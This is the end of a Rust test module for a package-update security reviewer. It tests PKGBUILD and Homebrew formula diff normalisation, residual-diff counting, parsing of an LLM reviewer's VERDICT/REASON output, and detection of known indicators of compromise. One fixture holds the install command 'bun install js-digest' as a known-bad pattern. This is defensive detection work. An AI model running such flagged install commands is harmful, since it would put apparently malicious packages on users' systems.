        assert_eq!(normalize_versions(content, "", "2.0.0"), content);
        assert_eq!(normalize_versions(content, "1.0.0", ""), content);
        assert_eq!(normalize_versions(content, "1.0.0", "1.0.0"), content);
    }

    #[test]
    fn test_normalize_versions_does_not_touch_version_inside_word() {
        // "v1.2" contains "1.2" preceded by an alphanumeric byte: leaving it
        // alone produces residual diff -> review, which is the safe direction.
        let content = "tag = \"v1.2\"";
        assert_eq!(normalize_versions(content, "1.2", "3.0"), content);
    }

    // ---- noise stripping edges ---------------------------------------------

    #[test]
    fn test_strip_pkgbuild_noise_removes_multiline_checksum_block() {
        let content = "source=(\"a\" \"b\")\nsha256sums=(\n  'hash-one'\n  'hash-two'\n)\nbuild() {\n  true\n}";
        let stripped = strip_pkgbuild_noise(content);
        assert!(!stripped.contains("hash-one"));
        assert!(!stripped.contains("hash-two"));
        assert!(stripped.contains("build()"));
    }

    #[test]
    fn test_strip_pkgbuild_noise_handles_all_checksum_families() {
        for key in ["md5sums=", "b2sums=", "sha512sums=", "cksums="] {
            let content = format!("package() {{\n  true\n}}\n{key}('hash')\n");
            assert!(
                !strip_pkgbuild_noise(&content).contains(key),
                "checksum family {key} was not stripped"
            );
        }
    }

    #[test]
    fn test_strip_pkgbuild_noise_unterminated_block_degrades_gracefully() {
        // malformed PKGBUILD: never panic, drop only what was clearly the block
        let content = "sha256sums=(\n  'hash'\n";
        let stripped = strip_pkgbuild_noise(content);
        assert!(!stripped.contains("hash"));
    }

    #[test]
    fn test_strip_formula_noise_preserves_other_blocks() {
        let content = "class Foo < Formula\n  head do\n    url \"https://git.example\"\n  end\n\n  bottle do\n    rebuild 1\n    sha256 cellar: :any, arm64: \"aaa\"\n  end\n\n  def install\n    system \"make\"\n  end\nend";
        let stripped = strip_formula_noise(content);
        assert!(stripped.contains("head do"));
        assert!(stripped.contains("def install"));
        assert!(!stripped.contains("rebuild 1"));
        assert!(stripped.matches("end").count() >= 3);
    }

    // ---- residual diff semantics --------------------------------------------

    #[test]
    fn test_compute_residual_reports_only_real_changes() {
        let old = "depends_on \"openssl@3\"\ndepends_on \"zstd\"\n";
        let new = "depends_on \"openssl@3\"\ndepends_on \"zstd\"\ndepends_on \"libpsl\"\n";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert!(residual.contains("+depends_on \"libpsl\""));
        assert_eq!(count_residual_lines(&residual), 1);
    }

    #[test]
    fn test_compute_residual_counts_removed_lines() {
        let old = "depends_on \"openssl@3\"\n";
        let new = "";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert!(residual.contains("-depends_on"));
        assert_eq!(count_residual_lines(&residual), 1);
    }

    #[test]
    fn test_compute_residual_changed_line_counts_as_two() {
        let old = "url \"https://x.example/a.tar.gz\"\n";
        let new = "url \"https://y.example/b.tar.gz\"\n";
        let residual = compute_residual(old, new, "1.0.0", "2.0.0", false);
        assert_eq!(count_residual_lines(&residual), 2);
    }

    #[test]
    fn test_count_residual_lines_ignores_diff_headers() {
        let diff = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1 +1 @@\n-old line\n+new line\n";
        assert_eq!(count_residual_lines(diff), 2);
    }

    #[test]
    fn test_compute_residual_formula_checksum_and_version_churn_is_silent() {
        let old = "version \"3.1.4\"\nsha256 \"aaaaaaaa\"\nbottle do\n  rebuild 2\n  sha256 cellar: :any, arm64: \"bbbb\"\nend\n";
        let new = "version \"3.2.0\"\nsha256 \"cccccccc\"\nbottle do\n  rebuild 1\n  sha256 cellar: :any, arm64: \"dddd\"\nend\n";
        let residual = compute_residual(old, new, "3.1.4", "3.2.0", false);
        assert_eq!(count_residual_lines(&residual), 0);
    }

    // ---- verdict parsing robustness ------------------------------------------

    #[test]
    fn test_parse_verdict_output_handles_llm_preamble_and_suffix() {
        let output = "Sure, here is my analysis.\n\nVERDICT: safe\nREASON: version bump only\n\nHope this helps!";
        let (verdict, reason) = parse_verdict_output(output).unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
        assert_eq!(reason, "version bump only");
    }

    #[test]
    fn test_parse_verdict_output_is_case_insensitive() {
        let (verdict, _) = parse_verdict_output("VERDICT: BLOCK\nREASON: malware").unwrap();
        assert_eq!(verdict, ReviewVerdict::Block);
    }

    #[test]
    fn test_parse_verdict_output_handles_crlf() {
        let (verdict, reason) =
            parse_verdict_output("VERDICT: review\r\nREASON: new network call\r\n").unwrap();
        assert_eq!(verdict, ReviewVerdict::Review);
        assert_eq!(reason, "new network call");
    }

    #[test]
    fn test_parse_verdict_output_first_verdict_wins() {
        let (verdict, _) =
            parse_verdict_output("VERDICT: safe\nVERDICT: block\nREASON: a").unwrap();
        assert_eq!(verdict, ReviewVerdict::Safe);
    }

    #[test]
    fn test_parse_verdict_output_keeps_reason_with_colons() {
        let (_, reason) =
            parse_verdict_output("VERDICT: block\nREASON: IoC: atomic-lockfile at line 12")
                .unwrap();
        assert_eq!(reason, "IoC: atomic-lockfile at line 12");
    }

    #[test]
    fn test_parse_verdict_output_invalid_verdict_is_none() {
        assert!(parse_verdict_output("VERDICT: maybe\nREASON: unsure").is_none());
        assert!(parse_verdict_output("").is_none());
    }

    // ---- report helpers -------------------------------------------------------

    #[test]
    fn test_unavailable_report_is_inconclusive() {
        let report = ReviewReport::unavailable("could not fetch");
        assert_eq!(report.verdict, ReviewVerdict::Review);
        assert_eq!(report.view_mode, ReviewViewMode::Unavailable);
        assert!(!report.has_known_ioc());
    }

    #[test]
    fn test_has_known_ioc_detection() {
        let report = ReviewReport {
            verdict: ReviewVerdict::Block,
            reason: "test".to_string(),
            view_mode: ReviewViewMode::Diff,
            residual_line_count: 1,
            hits: vec![KnownBadHit {
                severity: HitSeverity::KnownIoc,
                pattern: "js-digest".to_string(),
                line_number: 4,
                line: "bun install js-digest".to_string(),
            }],
        };
        assert!(report.has_known_ioc());
    }

    // ---- end-to-end (opt-in: network + brew + opencode) ----------------------

    #[test]
    #[ignore = "end-to-end: requires network, brew and an authenticated opencode"]
    fn test_review_formula_end_to_end_curl() {
        let runtime = tokio::runtime::Runtime::new().unwrap();
        runtime.block_on(async {
            let dep = Dependency {
                name: "curl".to_string(),
                current_version: "8.19.0".to_string(),
                latest_version: "8.21.0".to_string(),
                ecosystem: Ecosystem::Homebrew,
                is_global: true,
                origin: None,
            };
            let report = review_package(&dep, &Config::default()).await;
            eprintln!("review report: {report:#?}");
            assert_eq!(
                report.view_mode,
                ReviewViewMode::Diff,
                "expected baseline commit to resolve for curl 8.19.0"
            );
            assert!(
                report.residual_line_count > 0,
                "curl 8.19.0 -> 8.21.0 added libpsl; residual must not be empty"
            );
        });
    }
}
